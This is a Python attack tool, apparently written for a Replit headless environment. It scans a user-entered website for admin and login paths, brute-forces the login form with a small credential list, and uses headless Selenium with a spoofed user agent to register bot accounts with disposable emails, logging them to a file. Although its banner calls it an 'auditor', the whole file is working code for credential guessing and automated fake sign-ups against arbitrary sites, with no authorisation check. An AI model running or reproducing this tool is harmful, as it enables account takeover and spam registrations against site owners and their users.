import os
import time
import random
import string
import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service

class UltimateFullSystem:
    def __init__(self, target_url):
        self.target = target_url if target_url.startswith("http") else "https://" + target_url
        self.session = requests.Session()
        self.found_login_url = None
        
        # Chrome Options for Replit Headless environment
        self.chrome_options = Options()
        self.chrome_options.add_argument('--headless')
        self.chrome_options.add_argument('--no-sandbox')
        self.chrome_options.add_argument('--disable-dev-shm-usage')
        self.chrome_options.add_argument('--window-size=1920,1080')
        self.chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')

    # --- PHASE 1: DISCOVERY ---
    def find_admin_path(self):
        paths = ['admin', 'login', 'wp-login.php', 'administrator', 'cp', 'signup', 'register']
        print(f"[*] Scanning {self.target} for panels...")
        for path in paths:
            url = f"{self.target}/{path}"
            try:
                r = self.session.get(url, timeout=5)
                if r.status_code == 200:
                    print(f"[+] Found Access Point: {url}")
                    self.found_login_url = url
                    return url
            except: continue
        return self.target

    # --- PHASE 2: BRUTE FORCE (Requests) ---
    def brute_force(self, login_url, user_list, pass_list):
        print(f"[*] Starting Brute Force on {login_url}...")
        for u in user_list:
            for p in pass_list:
                # Automatic field detection
                try:
                    res = self.session.get(login_url)
                    soup = BeautifulSoup(res.text, 'html.parser')
                    form = soup.find('form')
                    inputs = form.find_all('input')
                    data = {i.get('name'): i.get('value', '') for i in inputs if i.get('name')}
                    
                    # Target common field names
                    u_key = next((k for k in data if 'user' in k.lower() or 'mail' in k.lower()), 'username')
                    p_key = next((k for k in data if 'pass' in k.lower()), 'password')
                    
                    data[u_key] = u
                    data[p_key] = p
                    
                    post_res = self.session.post(login_url, data=data)
                    if post_res.history or "dashboard" in post_res.text.lower():
                        print(f"\n[!!!] LOGIN SUCCESS: {u}:{p}")
                        return (u, p)
                except: continue
        print("[-] Brute force finished. No matches.")

    # --- PHASE 3: AUTO-REGISTER (Selenium) ---
    def auto_register(self):
        print("[*] Launching Browser for Auto-Registration...")
        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=self.chrome_options)
        
        # Generate random identity
        name = "bot" + ''.join(random.choices(string.ascii_lowercase, k=5))
        email = f"{name}@mail7.io"
        pwd = "Pass!" + ''.join(random.choices(string.digits, k=6))
        
        try:
            driver.get(self.target)
            time.sleep(3)
            # Find any link that looks like registration
            reg_link = driver.find_element(By.PARTIAL_LINK_TEXT, "Register") or \
                       driver.find_element(By.PARTIAL_LINK_TEXT, "Sign Up")
            reg_link.click()
            time.sleep(2)
            
            inputs = driver.find_elements(By.TAG_NAME, "input")
            for i in inputs:
                attr = (i.get_attribute("name") or i.get_attribute("id") or "").lower()
                if "user" in attr: i.send_keys(name)
                elif "mail" in attr: i.send_keys(email)
                elif "pass" in attr: i.send_keys(pwd)
            
            inputs[-1].send_keys(Keys.RETURN)
            time.sleep(5)
            print(f"[SUCCESS] Registered New Account: {name} | {pwd}")
            with open("saved_accounts.txt", "a") as f:
                f.write(f"{self.target} | {name}:{pwd} | {email}\n")
        except Exception as e:
            print(f"[!] Browser Error: {e}")
        finally:
            driver.quit()

# --- MAIN EXECUTION ---
if __name__ == "__main__":
    print("--- ULTIMATE FULL SYSTEM AUDITOR ---")
    site = input("Enter Target Website: ")
    system = UltimateFullSystem(site)
    
    print("\nSelect Mode:")
    print("1. Find Admin & Brute Force")
    print("2. Auto-Register Account")
    print("3. Full System Run (All)")
    
    mode = input("Choice: ")
    
    if mode == "1" or mode == "3":
        login_url = system.find_admin_path()
        system.brute_force(login_url, ['admin', 'root'], ['admin123', 'password'])
        
    if mode == "2" or mode == "3":
        system.auto_register()
